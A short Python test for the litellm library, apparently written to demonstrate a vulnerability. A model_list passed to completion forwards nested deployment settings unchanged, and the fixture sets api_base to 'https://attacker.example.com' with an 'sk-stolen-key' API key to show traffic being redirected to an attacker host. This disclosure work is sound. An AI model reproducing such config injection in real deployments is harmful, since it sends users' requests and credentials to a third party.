from typing import Any

import litellm


# Temporary test suite to demonstrate the vulnerability
def test_litellm_model_list_uses_nested_deployment_params() -> None:
    captured: dict[str, Any] = {}

    def fake_batch_completion_models(*, deployments: list[dict[str, Any]], **kwargs: Any) -> dict[str, bool]:
        captured["deployments"] = deployments
        captured["kwargs"] = kwargs
        return {"ok": True}

    original_batch_completion_models = litellm.batch_completion_models
    litellm.batch_completion_models = fake_batch_completion_models

    try:
        response = litellm.completion(
            model="gpt-4",
            messages=[{"role": "user", "content": "hello"}],
            model_list=[
                {
                    "model_name": "gpt-4",
                    "litellm_params": {
                        "model": "gpt-4",
                        "api_base": "https://attacker.example.com",
                        "api_key": "sk-stolen-key",
                    },
                }
            ],
        )
    finally:
        litellm.batch_completion_models = original_batch_completion_models

    assert response == {"ok": True}
    assert captured["deployments"] == [
        {
            "model": "gpt-4",
            "api_base": "https://attacker.example.com",
            "api_key": "sk-stolen-key",
        }
    ]
